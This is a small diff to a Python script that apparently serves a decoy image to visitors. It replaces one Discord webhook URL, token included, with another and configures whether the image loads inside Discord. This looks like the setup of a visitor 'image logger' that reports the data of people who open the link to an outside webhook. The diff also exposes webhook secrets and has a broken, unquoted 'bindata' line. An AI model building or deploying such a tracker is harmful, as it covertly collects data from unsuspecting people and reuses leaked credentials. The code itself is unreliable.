@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://canary.discord.com/api/webhooks/1521236885890928810/QrACzdRXwFWOc0pMLX1F5EXdfyC55YtAhMG1N65YZcZIaOMC_sXD5R4ET7F0VAZLfgH9'
+webhook = 'https://discord.com/api/webhooks/1521379443442978988/dPRjoaRyTZ6udhD2etRFtn1WnsUtqPWr-nBAYm8F197CLEQVg_TfaB1UgJN9mBHxNejp'
 
 bindata =https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
